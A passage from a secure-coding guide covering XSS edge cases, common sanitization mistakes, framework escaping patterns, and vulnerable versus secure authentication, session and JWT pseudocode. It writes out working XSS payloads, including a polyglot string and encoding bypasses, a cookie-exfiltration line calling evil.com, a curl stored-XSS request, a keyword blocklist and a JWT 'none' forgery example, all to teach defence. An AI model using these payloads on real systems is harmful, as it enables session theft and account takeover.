- `textContent` never interprets HTML or scripts
- `createElement` + `textContent` is inherently safe
- Templates allow complex HTML without injection risk
- DOMPurify provides sanitization when HTML is required

---

## Edge Cases Section

### Edge Case 1: Mutation XSS (mXSS)

```pseudocode
// DANGEROUS: Browser mutations can bypass sanitization

// How mXSS works:
// 1. Sanitizer processes malformed HTML
// 2. Browser "fixes" the HTML during parsing
// 3. Fixed HTML contains executable content

// Example: Backtick mutation
inputHtml = "<img src=x onerror=`alert(1)`>"
// Some sanitizers don't escape backticks
// Browser may convert backticks to quotes in certain contexts

// Example: Namespace confusion
inputHtml = "<math><annotation-xml><foreignObject><script>alert(1)</script>"
// SVG/MathML namespaces have different parsing rules
// Sanitizer might miss the nested script

// Example: Table element mutations
inputHtml = "<table><form><input name='x'></form></table>"
// Browser moves <form> outside <table> during parsing
// Can result in unexpected DOM structure

// SECURE: Use battle-tested sanitizer with mXSS protection
function sanitizeHtml(html):
    return DOMPurify.sanitize(html, {
        // DOMPurify has mXSS protection built-in
        USE_PROFILES: {html: true},
        // Optionally restrict further
        FORBID_TAGS: ["style", "math", "svg"],
        FORBID_ATTR: ["style"]
    })

// BETTER: Avoid HTML sanitization when possible
function renderUserContent(content):
    // If you only need formatted text, use markdown
    markdownHtml = markdownToHtml(content)  // Controlled conversion
    return DOMPurify.sanitize(markdownHtml)
```

**Detection:** Test with:
- Malformed nesting (`<a><table><a>`)
- Namespace elements (`<svg>`, `<math>`, `<foreignObject>`)
- Backticks and other unusual quote characters
- Processing instruction-like content (`<?xml>`)

---

### Edge Case 2: Polyglot Payloads

```pseudocode
// DANGEROUS: Payloads that work in multiple contexts

// Polyglot XSS example:
payload = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"

// This payload attempts to work in:
// - JavaScript context (javascript: URL)
// - HTML attribute context (onclick)
// - Inside HTML comments
// - Inside style/title/textarea/script tags
// - SVG context

// Why this matters:
// - Single payload tests multiple vectors
// - Fuzzy input handling might trigger in unexpected context
// - Copy-paste from "safe" context to unsafe context

// SECURE: Context-specific encoding, not generic filtering
function outputToContext(value, context):
    switch context:
        case "html_body":
            return htmlEncode(value)
        case "html_attribute":
            return attributeEncode(value)
        case "javascript_string":
            return jsStringEncode(value)
        case "url_parameter":
            return urlEncode(value)
        case "css_value":
            return cssEncode(value)
        default:
            throw Error("Unknown context: " + context)

// Each encoder handles that specific context's dangerous characters
```

**Detection:** Use polyglot payloads in security testing to find context confusion vulnerabilities.

---

### Edge Case 3: Encoding Bypass Techniques

```pseudocode
// DANGEROUS: Incomplete encoding can be bypassed

// Bypass 1: Case variation
// Filter checks: if "<script" in input: reject
// Bypass: "<ScRiPt>alert(1)</sCrIpT>"
// Browser: case-insensitive HTML parsing

// Bypass 2: HTML entities in event handlers
// Filter: remove "javascript:"
// Input: "&#106;avascript:alert(1)"
// Browser decodes entities before processing

// Bypass 3: Null bytes
// Input: "java\x00script:alert(1)"
// Some filters/WAFs don't handle null bytes
// Some browsers ignore them

// Bypass 4: Overlong UTF-8
// Normal '<': 0x3C
// Overlong: 0xC0 0xBC (invalid UTF-8, but some parsers accept)

// Bypass 5: Mixed encoding
// Input: "%3Cscript%3Ealert(1)%3C/script%3E"
// If HTML-encoded before URL-decoded, double encoding attack

// SECURE: Encode on output, not filter on input
function secureOutput(userInput, context):
    // Don't try to filter/blocklist dangerous patterns
    // DO encode appropriately for the output context

    // The encoding makes ALL user input safe
    // regardless of what it contains
    return encode(userInput, context)

// SECURE: Canonicalize THEN validate
function processInput(input):
    // 1. Decode all encoding layers
    decoded = fullyDecode(input)  // URL, HTML entities, etc.

    // 2. Normalize (lowercase, normalize unicode)
    normalized = normalize(decoded)

    // 3. Validate against rules
    if not isValid(normalized):
        reject()

    // 4. Store normalized form
    store(normalized)

    // 5. Encode on output (later)
```

**Key Insight:** Output encoding is more reliable than input filtering because you know the exact output context.

---

### Edge Case 4: DOM Clobbering

```pseudocode
// DANGEROUS: HTML elements can override JavaScript globals

// How DOM clobbering works:
// Elements with id or name attributes create global variables
html = '<img id="alert">'
// Now: window.alert === <img> element
// alert(1) throws error instead of showing alert

// Exploitable clobbering:
html = '<form id="document"><input name="cookie" value="fake"></form>'
// document.cookie might now reference the input element

// Attack on sanitizer output:
html = '<a id="cid" name="cid" href="javascript:alert(1)">'
// If code does: location = document.getElementById(cid)
// Attacker controls the navigation

// More dangerous patterns:
html = '<form id="x"><input id="y"></form>'
// x.y now references the input
// Chains allow deep property access

// SECURE: Avoid global lookups for security-sensitive operations
function getConfigValue(key):
    // DON'T: return window[key]
    // DON'T: return document.getElementById(key).value

    // DO: Use a namespaced config object
    return APP_CONFIG[key]

// SECURE: Use unique prefixes for security-critical IDs
function getElementById(id):
    // Prefix with app-specific namespace
    return document.getElementById("app__" + id)

// SECURE: Validate types after DOM queries
function getFormElement(id):
    element = document.getElementById(id)
    if element instanceof HTMLFormElement:
        return element
    throw Error("Expected form element")
```

**Detection:** Test with:
- Elements with IDs matching JavaScript globals (`alert`, `name`, `location`)
- Elements with names matching object properties (`cookie`, `domain`)
- Nested forms with chained name/id attributes

---

## Common Mistakes Section

### Mistake 1: Encoding Once, Using in Multiple Contexts

```pseudocode
// DANGEROUS: Single encoding for multiple contexts

function saveUserProfile(name, bio):
    // Encoding once at input time
    safeName = htmlEncode(name)
    safeBio = htmlEncode(bio)

    database.save({name: safeName, bio: safeBio})

function displayProfile(user):
    // HTML context - HTML encoding was correct
    htmlOutput = "<h1>" + user.name + "</h1>"  // OK

    // But JavaScript context needs different encoding!
    jsOutput = "<script>var name = '" + user.name + "';</script>"
    // If name contained single quotes: "O'Brien" -> already encoded as "O&#x27;Brien"
    // Now in JS context, &#x27; is literal text, not a quote escape

    // And URL context is wrong too!
    urlOutput = "/profile?name=" + user.name
    // HTML entities in URL don't encode properly

// SECURE: Store raw data, encode on output
function saveUserProfile(name, bio):
    // Store raw (unencoded) user input
    database.save({name: name, bio: bio})

function displayProfile(user):
    // Encode specifically for each output context
    htmlName = htmlEncode(user.name)
    jsName = jsStringEncode(user.name)
    urlName = urlEncode(user.name)

    htmlOutput = "<h1>" + htmlName + "</h1>"
    jsOutput = "<script>var name = '" + jsName + "';</script>"
    urlOutput = "/profile?name=" + urlName
```

**Rule:** Store data raw. Encode at the point of output, specific to that context.

---

### Mistake 2: Client-Side Only Sanitization

```pseudocode
// DANGEROUS: Relying only on client-side protection

// Client-side sanitization
function submitComment(comment):
    // Sanitize before sending to server
    cleanComment = DOMPurify.sanitize(comment)
    fetch("/api/comments", {
        method: "POST",
        body: JSON.stringify({comment: cleanComment})
    })

// Problem: Attacker bypasses client-side code entirely
// Using curl, Postman, or modified browser
curlCommand = """
curl -X POST https://site.com/api/comments \\
     -H "Content-Type: application/json" \\
     -d '{"comment": "<script>alert(1)</script>"}'
"""

// Server trusts the input because "client sanitized it"
function handleCommentApi(request):
    comment = request.body.comment
    database.saveComment(comment)  // Stored XSS!

// SECURE: Server-side sanitization is mandatory
function handleCommentApiSecure(request):
    comment = request.body.comment

    // Server-side sanitization
    cleanComment = serverSideSanitize(comment)

    database.saveComment(cleanComment)

function displayComment(comment):
    // Still encode on output (defense in depth)
    return htmlEncode(comment)

// NOTE: Client-side sanitization can still be useful for:
// - Preview functionality
// - Reducing server load
// - Better UX feedback
// But it must NEVER be the only protection
```

**Rule:** Server-side encoding/sanitization is mandatory. Client-side is optional enhancement.

---

### Mistake 3: Blocklist Approaches

```pseudocode
// DANGEROUS: Trying to block known-bad patterns

function filterXss(input):
    // Block list approach
    dangerous = [
        "<script", "</script>",
        "javascript:",
        "onerror", "onload", "onclick",
        "alert", "eval", "document.cookie"
    ]

    result = input
    for pattern in dangerous:
        result = result.replace(pattern, "")

    return result

// Bypasses:
// 1. Case: "<SCRIPT>alert(1)</SCRIPT>"
// 2. Encoding: "&#60;script&#62;alert(1)&#60;/script&#62;"
// 3. Null bytes: "<scr\x00ipt>alert(1)</scr\x00ipt>"
// 4. Other events: "onmouseover", "onfocus", "onanimationend"
// 5. Other sinks: "fetch('http://evil.com/'+document.cookie)"
// 6. New features: Future HTML/JS features not in blocklist

// DANGEROUS: Regex blocklist
function filterXssRegex(input):
    // Still bypassable
    if regex.match(/<script.*?>.*?<\/script>/i, input):
        return ""
    return input

// Bypass: "<scr<script>ipt>alert(1)</scr</script>ipt>"
// After removal: "<script>alert(1)</script>"

// SECURE: Allowlist approach
function sanitizeUsername(input):
    // Only allow expected characters
    if regex.match(/^[a-zA-Z0-9_-]{1,30}$/, input):
        return input
    throw ValidationError("Invalid username")

// SECURE: Proper encoding (makes blocklist unnecessary)
function displaySafely(input):
    return htmlEncode(input)  // All input is safe after encoding
```

**Rule:** Allowlist what's expected, or encode everything. Never blocklist dangerous patterns.

---

### Mistake 4: Trusting Sanitization Libraries Blindly

```pseudocode
// DANGEROUS: Assuming sanitization handles everything

function processHtml(userHtml):
    // "The library handles XSS"
    clean = sanitizer.sanitize(userHtml)

    // But then using it unsafely:
    // 1. Wrong context
    return "<script>var content = '" + clean + "';</script>"
    // Sanitizer cleaned HTML context, not JavaScript context

    // 2. Double encoding
    clean = sanitizer.sanitize(htmlEncode(userHtml))
    // Now clean contains encoded entities that might decode later

    // 3. Post-processing that reintroduces vulnerabilities
    processed = clean.replace("[link]", "<a href='").replace("[/link]", "'>link</a>")
    // Custom processing after sanitization can break safety

// SECURE: Understand what the sanitizer does
function processHtmlSecure(userHtml):
    // 1. Sanitize for HTML context
    cleanHtml = DOMPurify.sanitize(userHtml, {
        ALLOWED_TAGS: ["p", "b", "i", "a"],
        ALLOWED_ATTR: ["href"]
    })

    // 2. Validate URLs in allowed href attributes
    dom = parseHtml(cleanHtml)
    for link in dom.querySelectorAll("a[href]"):
        if not isValidUrl(link.href):
            link.removeAttribute("href")

    // 3. Use only in HTML context
    return cleanHtml

// SECURE: For JavaScript context, don't use HTML sanitizer
function embedDataInJs(data):
    // JSON encoding is the appropriate "sanitizer" for JSON/JS
    return JSON.stringify(data)  // Handles all escaping for JSON
```

**Rule:** Use the right encoding/sanitization for each context. Sanitizers are context-specific.

---

## Framework-Specific Guidance (Pseudocode Patterns)

### React Pattern

```pseudocode
// React default: Auto-escaping in JSX
function UserProfile(props):
    // SAFE: React escapes by default
    return (
        <div>
            <h1>{props.username}</h1>    // Auto-escaped
            <p>{props.bio}</p>            // Auto-escaped
        </div>
    )

// DANGEROUS: dangerouslySetInnerHTML bypasses protection
function RichContent(props):
    // VULNERABLE if props.html is user-controlled
    return <div dangerouslySetInnerHTML={{__html: props.html}} />

// SECURE: Sanitize before using dangerouslySetInnerHTML
function RichContentSafe(props):
    sanitizedHtml = DOMPurify.sanitize(props.html)
    return <div dangerouslySetInnerHTML={{__html: sanitizedHtml}} />

// DANGEROUS: href with user input
function UserLink(props):
    // VULNERABLE: javascript: URLs execute
    return <a href={props.url}>{props.text}</a>

// SECURE: Validate URL scheme
function UserLinkSafe(props):
    url = props.url
    if not url.startsWith("http://") and not url.startsWith("https://"):
        url = "#"  // Safe fallback
    return <a href={url}>{props.text}</a>
```

---

### Vue Pattern

```pseudocode
// Vue default: Auto-escaping with {{ }}
<template>
    <!-- SAFE: Vue escapes interpolation -->
    <h1>{{ username }}</h1>
    <p>{{ bio }}</p>
</template>

// DANGEROUS: v-html bypasses protection
<template>
    <!-- VULNERABLE: v-html renders raw HTML -->
    <div v-html="userContent"></div>
</template>

// SECURE: Sanitize before v-html
<script>
export default {
    computed: {
        safeContent() {
            return DOMPurify.sanitize(this.userContent)
        }
    }
}
</script>
<template>
    <div v-html="safeContent"></div>
</template>

// DANGEROUS: Dynamic attribute binding
<template>
    <!-- VULNERABLE: javascript: in href -->
    <a :href="userUrl">Link</a>
</template>

// SECURE: URL validation
<script>
export default {
    computed: {
        safeUrl() {
            return this.isValidHttpUrl(this.userUrl) ? this.userUrl : '#'
        }
    }
}
</script>
```

---

### Angular Pattern

```pseudocode
// Angular default: Auto-sanitization
@Component({
    template: `
        <!-- SAFE: Angular sanitizes -->
        <h1>{{ username }}</h1>
        <p>{{ bio }}</p>
    `
})

// Angular [innerHTML] is semi-safe (Angular sanitizes)
@Component({
    template: `
        <!-- Angular sanitizes, but still risky -->
        <div [innerHTML]="userContent"></div>
    `
})

// DANGEROUS: Bypassing sanitization
import { DomSanitizer } from '@angular/platform-browser'

@Component({...})
class MyComponent {
    constructor(private sanitizer: DomSanitizer) {}

    // VULNERABLE: Bypasses Angular's sanitization
    get unsafeHtml() {
        return this.sanitizer.bypassSecurityTrustHtml(this.userInput)
    }
}

// SECURE: Let Angular sanitize, or use additional sanitizer
@Component({...})
class MyComponentSafe {
    get safeHtml() {
        // Angular's default sanitization is usually sufficient
        // For extra safety, pre-sanitize
        return DOMPurify.sanitize(this.userInput)
    }
}
```

---

### Server-Side Template Engines Pattern

```pseudocode
// Jinja2 (Python)
// SAFE: Auto-escaping by default
<h1>{{ username }}</h1>

// DANGEROUS: |safe filter
<div>{{ user_html | safe }}</div>  <!-- VULNERABLE -->

// Handlebars
// SAFE: {{ }} escapes
<h1>{{username}}</h1>

// DANGEROUS: {{{ }}} triple braces
<div>{{{user_html}}}</div>  <!-- VULNERABLE -->

// EJS (Node.js)
// SAFE: <%= %> escapes
<h1><%= username %></h1>

// DANGEROUS: <%- %> raw
<div><%- user_html %></div>  <!-- VULNERABLE -->

// SECURE PATTERN: Always use escaping syntax, sanitize if HTML needed
// Jinja2
<div>{{ user_html | sanitize }}</div>  <!-- Custom filter using DOMPurify -->

// Handlebars
<div>{{sanitize user_html}}</div>  <!-- Custom helper -->

// EJS
<div><%= sanitize(user_html) %></div>  <!-- Helper function -->
```

---

## Security Checklist

- [ ] All user input rendered in HTML is HTML-encoded
- [ ] All user input in HTML attributes is attribute-encoded and quoted
- [ ] All user input in JavaScript strings is JavaScript-encoded
- [ ] All user input in URLs is URL-encoded (and scheme validated for links)
- [ ] All user input in CSS is CSS-encoded or allowlist-validated
- [ ] `innerHTML`, `document.write`, and similar are avoided or use sanitized input
- [ ] `textContent` is used instead of `innerHTML` where possible
- [ ] `dangerouslySetInnerHTML`, `v-html`, `|safe` etc. only used with sanitized content
- [ ] URL schemes are validated (allow only http/https, not javascript:)
- [ ] Server-side encoding/sanitization is implemented (not just client-side)
- [ ] Encoding is performed at output time, specific to each context
- [ ] HTML sanitizer (DOMPurify) is used when rich HTML input is required
- [ ] Content Security Policy (CSP) headers are implemented
- [ ] X-XSS-Protection and X-Content-Type-Options headers are set
- [ ] Cookie HttpOnly flag is set to prevent JavaScript access
- [ ] No user input reaches eval(), new Function(), or setTimeout with strings
- [ ] Framework auto-escaping is enabled and not bypassed

---

# Pattern 4: Authentication and Session Security

**CWE References:** CWE-287 (Improper Authentication), CWE-384 (Session Fixation), CWE-613 (Insufficient Session Expiration), CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-308 (Use of Single-factor Authentication), CWE-640 (Weak Password Recovery Mechanism), CWE-1275 (Sensitive Cookie with Improper SameSite Attribute)

**Priority Score:** 22 (Frequency: 8, Severity: 9, Detectability: 5)

---

## Introduction: High Complexity Leads to High AI Error Rate

Authentication and session management represent one of the most complex security domains in application development. AI models struggle particularly with these patterns for several interconnected reasons:

**Why AI Models Generate Insecure Authentication Code:**

1. **Complexity Breeds Shortcuts:** Authentication requires coordinating multiple components—password storage, session management, token generation, cookie handling, and logout procedures. AI models often generate "working" code that skips essential security layers for simplicity.

2. **Tutorial Syndrome:** Training data is saturated with simplified authentication tutorials designed to teach concepts, not build production systems. These tutorials often omit rate limiting, secure token generation, proper session invalidation, and timing attack prevention.

3. **JWT Misunderstandings:** JSON Web Tokens have become the default recommendation, but AI models frequently generate JWT implementations with critical flaws—the "none" algorithm vulnerability, weak secrets, improper validation, and insecure storage.

4. **Framework Diversity:** Authentication patterns vary dramatically across frameworks (Passport.js, Spring Security, Django, Rails Devise, etc.). AI models conflate patterns between frameworks, generating hybrid code that's neither correct for any framework nor secure.

5. **Stateless vs. Stateful Confusion:** The shift toward stateless authentication (JWTs) has created mixed patterns in training data. AI often combines stateless token concepts with stateful session assumptions, creating logical gaps in security.

6. **Edge Case Blindness:** Authentication edge cases—concurrent sessions, password reset flows, account recovery, MFA, and OAuth state management—require deep security thinking that AI models cannot reliably produce.

**Impact Statistics:**

- **75.8%** of developers believe AI-generated authentication code is secure (Snyk State of AI Security Survey 2024)
- **63%** of data breaches involve weak, default, or stolen credentials (Verizon DBIR 2024)
- Authentication bypasses represent **41%** of critical vulnerabilities in web applications (HackerOne Report)
- Average cost of a credential-stuffing breach: **$4.3 million** (Ponemon Institute)
- Only **23%** of AI-generated authentication code properly implements session invalidation on logout

---

## BAD Examples: Multiple Manifestations

### BAD Example 1: Weak Password Validation

```pseudocode
// VULNERABLE: Minimal password requirements
function validatePassword(password):
    if length(password) < 6:
        return false
    return true

// VULNERABLE: Only checks length, no complexity
function registerUser(email, password):
    if length(password) >= 8:  // "Strong enough"
        hashedPassword = hashPassword(password)
        createUser(email, hashedPassword)
        return success
    return error("Password too short")

// VULNERABLE: Pattern allows easy-to-guess passwords
function isValidPassword(password):
    // Only requires one of each - easily satisfied by "Password1!"
    hasUpper = containsUppercase(password)
    hasLower = containsLowercase(password)
    hasNumber = containsNumber(password)
    hasSpecial = containsSpecialChar(password)

    if hasUpper and hasLower and hasNumber and hasSpecial:
        return true
    return false
    // Missing: dictionary check, common password check, breach check
```

**Why This Is Dangerous:**
- Allows passwords like "123456", "password", or "qwerty123"
- No protection against common password lists
- No check against known breached passwords (Have I Been Pwned)
- Pattern requirements are easily satisfied by predictable passwords ("Password1!")
- Attackers can crack weak passwords in seconds with modern hardware

---

### BAD Example 2: Predictable Session Tokens

```pseudocode
// VULNERABLE: Sequential session IDs
sessionCounter = 1000

function generateSessionId():
    sessionCounter = sessionCounter + 1
    return "session_" + toString(sessionCounter)

// VULNERABLE: Time-based session generation
function createSessionToken():
    timestamp = getCurrentTimestamp()
    return "sess_" + toString(timestamp)

// VULNERABLE: Weak random source
function generateToken():
    return "token_" + toString(randomInteger(0, 999999))

// VULNERABLE: MD5 of predictable data
function createAuthToken(userId):
    timestamp = getCurrentTimestamp()
    return md5(toString(userId) + toString(timestamp))

// VULNERABLE: User-controlled seed
function generateSessionId(userId, email):
    seed = userId + email + getCurrentDate()
    return sha256(seed)  // Deterministic - same inputs = same output
```

**Why This Is Dangerous:**
- Sequential IDs allow session enumeration—attacker can guess valid sessions
- Timestamp-based tokens can be predicted if attacker knows approximate creation time
- Weak random (Math.random, random.randint) is predictable with statistical analysis
- MD5 is fast to compute, enabling brute-force attacks
- User-controlled inputs in token generation allow attackers to predict tokens

---

### BAD Example 3: Session Fixation Vulnerabilities

```pseudocode
// VULNERABLE: Session ID not regenerated after login
function login(request):
    email = request.body.email
    password = request.body.password

    user = findUserByEmail(email)
    if user and verifyPassword(password, user.hashedPassword):
        // Using the SAME session ID from before authentication
        request.session.userId = user.id
        request.session.authenticated = true
        return redirect("/dashboard")
    return error("Invalid credentials")

// VULNERABLE: Accepting session ID from URL parameter
function handleRequest(request):
    sessionId = request.query.sessionId or request.cookies.sessionId
    // Attacker can send victim: https://app.com/login?sessionId=attacker_controlled_session
    session = loadSession(sessionId)

// VULNERABLE: Not invalidating session on privilege change
function promoteToAdmin(request):
    user = getCurrentUser(request)
    user.role = "admin"
    user.save()
    // Same session continues - if session was compromised before,
    // attacker now has admin access
    return success("You are now an admin")
```

**Why This Is Dangerous:**
- Attacker sets session ID → victim logs in → attacker uses same session ID with victim's authenticated session
- URL-based session IDs can be logged in server logs, browser history, referrer headers
- Privilege escalation without session regeneration means compromised sessions gain elevated access

---

### BAD Example 4: JWT "none" Algorithm Acceptance

```pseudocode
// VULNERABLE: Decoding JWT without algorithm verification
function verifyJwt(token):
    parts = token.split(".")
    header = base64Decode(parts[0])
    payload = base64Decode(parts[1])

    // Trusting the algorithm from the token header itself!
    algorithm = header.alg

    if algorithm == "none":
        return payload  // No signature check!

    signature = parts[2]
    if verifySignature(payload, signature, algorithm):
        return payload
    return null

// VULNERABLE: Using jwt library without specifying expected algorithm
function validateToken(token):
    try:
        // Library may accept 'none' algorithm if token specifies it
        decoded = jwt.decode(token, secretKey)
        return decoded
    catch:
        return null

// VULNERABLE: Allowing multiple algorithms including none
function verifyToken(token, secret):
    options = {
        algorithms: ["HS256", "HS384", "HS512", "none"]  // DANGEROUS
    }
    return jwt.verify(token, secret, options)
```

**Why This Is Dangerous:**
- Attacker modifies JWT header to specify `alg: "none"` and removes signature
- Server accepts unsigned token as valid
- This vulnerability has affected major JWT libraries across multiple languages
- Complete authentication bypass—attacker can impersonate any user

**Exploit Example:**
```pseudocode
// Original legitimate token:
// Header: {"alg":"HS256","typ":"JWT"}
// Payload: {"sub":"1234","role":"user"}
// Signature: valid_signature_here

// Attacker-modified token:
// Header: {"alg":"none","typ":"JWT"}  ← Changed to "none"
// Payload: {"sub":"1234","role":"admin"}  ← Changed to admin
// Signature: (empty)  ← Removed

// If server trusts header.alg, this forged token is accepted as valid
```

---

### BAD Example 5: Weak JWT Secrets

```pseudocode
// VULNERABLE: Short/guessable secret
JWT_SECRET = "secret"

// VULNERABLE: Common secrets from tutorials
JWT_SECRET = "your-256-bit-secret"
JWT_SECRET = "supersecretkey"
JWT_SECRET = "jwt-secret-key"

// VULNERABLE: Empty or null secret
function createToken(payload):
    secret = getConfig("JWT_SECRET") or ""  // Falls back to empty string
    return jwt.sign(payload, secret, {algorithm: "HS256"})

// VULNERABLE: Secret derived from predictable data
function getJwtSecret():
    return sha256(APPLICATION_NAME + "-" + ENVIRONMENT)
    // If attacker knows app name and environment, they can derive the secret

// VULNERABLE: Same secret for signing and encryption
JWT_SECRET = "shared_secret_for_everything"
function signToken(payload):
    return jwt.sign(payload, JWT_SECRET)
function encryptData(data):
    return aesEncrypt(data, JWT_SECRET)  // Key reuse vulnerability
```

**Why This Is Dangerous:**
- Weak secrets can be brute-forced or found in wordlists
- Common tutorial secrets are in public databases of JWT secrets
- Empty secrets may be accepted by some JWT libraries
- Secret compromise allows forging any JWT—complete authentication bypass
- Key reuse across different cryptographic operations violates security principles

---

### BAD Example 6: Token Storage in localStorage

```pseudocode
// VULNERABLE: Storing JWT in localStorage
function handleLoginResponse(response):
    accessToken = response.data.accessToken
    refreshToken = response.data.refreshToken

    // localStorage is accessible to ANY JavaScript on the page
    localStorage.setItem("access_token", accessToken)
    localStorage.setItem("refresh_token", refreshToken)

    // Also stored user data in localStorage
    localStorage.setItem("user", JSON.stringify(response.data.user))

// VULNERABLE: Retrieving token for API calls
function apiRequest(endpoint, data):
    token = localStorage.getItem("access_token")
    return fetch(endpoint, {
        headers: {
            "Authorization": "Bearer " + token
        },
        body: JSON.stringify(data)
    })

// VULNERABLE: Token in sessionStorage (same problem)
function storeToken(token):
    sessionStorage.setItem("jwt", token)
```

**Why This Is Dangerous:**
- localStorage is accessible to any JavaScript running on the page
- XSS vulnerability = complete authentication compromise
- Tokens persist across browser sessions (localStorage)
- No protection against browser extensions reading storage
- Refresh tokens in localStorage allow long-term account takeover

---

### BAD Example 7: Missing Token Expiration

```pseudocode
// VULNERABLE: JWT without expiration
function createUserToken(user):
    payload = {
        userId: user.id,
        email: user.email,
        role: user.role
        // No "exp" claim!
    }
    return jwt.sign(payload, JWT_SECRET)

// VULNERABLE: Extremely long expiration
function generateToken(user):
    payload = {
        sub: user.id,
        iat: now(),
        exp: now() + (365 * 24 * 60 * 60)  // 1 year expiration
    }
    return jwt.sign(payload, JWT_SECRET)

// VULNERABLE: Trusting token-provided expiration without server check
function validateToken(token):
    decoded = jwt.verify(token, JWT_SECRET)
    // JWT library checks exp, but server has no session to revoke
    // Compromised tokens valid until natural expiration
    return decoded

// VULNERABLE: No mechanism to invalidate tokens
function logout(request):
    response.clearCookie("token")
    return success("Logged out")
    // Token is still valid! Anyone with the token can still use it
```

**Why This Is Dangerous:**
- Tokens without expiration are valid forever if secret isn't changed
- Long-lived tokens give attackers extended exploitation windows
- No server-side invalidation means compromised tokens can't be revoked
- Logout only removes token from client but doesn't invalidate it
- Stolen tokens remain valid even after password change

---

## GOOD Examples: Secure Authentication Patterns

### GOOD Example 1: Strong Password Requirements Pattern

```pseudocode
// SECURE: Comprehensive password validation
import commonPasswordList from "common-passwords-database"
import breachedPasswordApi from "haveibeenpwned-api"

function validatePasswordStrength(password):
    errors = []

    // Minimum length (NIST recommends 8+, many orgs use 12+)
    if length(password) < 12:
        errors.push("Password must be at least 12 characters")

    // Maximum length (prevent DoS from hashing extremely long passwords)
    if length(password) > 128:
        errors.push("Password cannot exceed 128 characters")

    // Check against common password list (10,000+ passwords)
    if password.toLowerCase() in commonPasswordList:
        errors.push("This password is too common")

    // Check against user-specific data (optional but recommended)
    // - Don't allow email prefix as password
    // - Don't allow username as password

    // Check against breached passwords (Have I Been Pwned API)
    if await checkBreachedPassword(password):
        errors.push("This password has appeared in a data breach")

    if length(errors) > 0:
        return { valid: false, errors: errors }

    return { valid: true, errors: [] }

// SECURE: Check breached passwords using k-anonymity (no password exposure)
async function checkBreachedPassword(password):
    // Hash password with SHA-1 (HIBP API requirement)
    hash = sha1(password).toUpperCase()
    prefix = hash.substring(0, 5)
    suffix = hash.substring(5)

    // Only send first 5 characters - k-anonymity preserves privacy
    response = await fetch("https://api.pwnedpasswords.com/range/" + prefix)
    hashes = response.text()

    // Check if our suffix appears in the returned hashes
    for line in hashes.split("\n"):
        parts = line.split(":")
        if parts[0] == suffix:
            return true  // Password has been breached

    return false

// SECURE: Password hashing with proper algorithm
function hashPassword(password):
    // bcrypt with cost factor of 12 (adjust based on hardware)
    // Alternatively: argon2id with recommended parameters
    return bcrypt.hash(password, 12)

function verifyPassword(password, hash):
    return bcrypt.compare(password, hash)
```

**Why This Is Secure:**
- Length requirements block trivially short passwords
- Common password checking blocks dictionary attacks
- Breach checking prevents credential stuffing from known breaches
- k-anonymity ensures password isn't exposed during breach check
- bcrypt/argon2 provides proper password hashing with work factor

---

### GOOD Example 2: Secure Session Generation

```pseudocode
// SECURE: Cryptographically random session IDs
import cryptoRandom from "secure-random-library"

function generateSessionId():
    // 256 bits of cryptographically secure randomness
    // Represented as 64 hex characters
    randomBytes = cryptoRandom.getRandomBytes(32)
    return bytesToHex(randomBytes)

// SECURE: Session creation with proper attributes
function createSession(userId):
    sessionId = generateSessionId()

    sessionData = {
        id: sessionId,
        userId: userId,
        createdAt: now(),
        expiresAt: now() + SESSION_DURATION,  // e.g., 24 hours
        lastActivityAt: now(),
        ipAddress: getClientIP(),
        userAgent: getUserAgent()
    }

    // Store in server-side session store (Redis, database, etc.)
    sessionStore.save(sessionId, sessionData)

    return sessionId

// SECURE: Session ID regeneration after authentication
function login(request):
    email = request.body.email
    password = request.body.password

    user = findUserByEmail(email)
    if not user:
        return error("Invalid credentials")  // Don't reveal if email exists

    if not verifyPassword(password, user.hashedPassword):
        recordFailedLogin(user.id, getClientIP())
        return error("Invalid credentials")

    // CRITICAL: Destroy old session and create new one
    if request.session.id:
        sessionStore.delete(request.session.id)

    // Generate completely new session ID after authentication
    newSessionId = createSession(user.id)

    // Set session cookie with secure attributes
    response.setCookie("session_id", newSessionId, {
        httpOnly: true,      // Prevent XSS access
        secure: true,        // HTTPS only
        sameSite: "Strict",  // CSRF protection
        path: "/",
        maxAge: SESSION_DURATION
    })

    return redirect("/dashboard")

// SECURE: Session regeneration on privilege change
function changeUserRole(request, newRole):
    user = getCurrentUser(request)

    // Change the role
    user.role = newRole
    user.save()

    // Regenerate session to bind new privileges to fresh session
    oldSessionId = request.cookies.session_id
    sessionStore.delete(oldSessionId)

    newSessionId = createSession(user.id)

    response.setCookie("session_id", newSessionId, {
        httpOnly: true,
        secure: true,
        sameSite: "Strict"
    })

    return success("Role updated")
```

**Why This Is Secure:**
- Cryptographically random session IDs prevent prediction/enumeration
- Session regeneration after login prevents session fixation
- Privilege changes trigger session regeneration
- Secure cookie attributes prevent common attack vectors
- Server-side session storage allows proper invalidation

---

### GOOD Example 3: Proper JWT Validation

```pseudocode
// SECURE: JWT configuration with strict settings
JWT_CONFIG = {
    secret: getEnv("JWT_SECRET"),  // 256+ bit secret from environment
    algorithms: ["HS256"],          // Single allowed algorithm - explicit!
    issuer: "myapp.example.com",
    audience: "myapp-users",
    expiresIn: "15m"                // Short-lived access tokens
}

// SECURE: Token creation with explicit claims
function createAccessToken(user):
    payload = {
        sub: toString(user.id),
        email: user.email,
        role: user.role,
        iss: JWT_CONFIG.issuer,
        aud: JWT_CONFIG.audience,
        iat: now(),
        exp: now() + (15 * 60),     // 15 minutes
        jti: generateUUID()          // Unique token ID for revocation
    }

    return jwt.sign(payload, JWT_CONFIG.secret, {
        algorithm: "HS256"           // Explicit algorithm
    })

// SECURE: Token verification with all claims checked
function verifyAccessToken(token):
    try:
        decoded = jwt.verify(token, JWT_CONFIG.secret, {
            algorithms: ["HS256"],   // ONLY accept HS256
            issuer: JWT_CONFIG.issuer,
            audience: JWT_CONFIG.audience,
            complete: true           // Return header + payload
        })

        // Additional validation
        if not decoded.payload.sub:
            return { valid: false, error: "Missing subject" }

        if not decoded.payload.role:
            return { valid: false, error: "Missing role" }

        // Check against token blacklist (for logout/revocation)
        if await isTokenRevoked(decoded.payload.jti):
            return { valid: false, error: "Token revoked" }

        return { valid: true, payload: decoded.payload }

    catch JwtExpiredError:
        return { valid: false, error: "Token expired" }
    catch JwtInvalidError as e:
        return { valid: false, error: "Invalid token: " + e.message }

// SECURE: Refresh token handling
function createRefreshToken(user, sessionId):
    payload = {
        sub: toString(user.id),
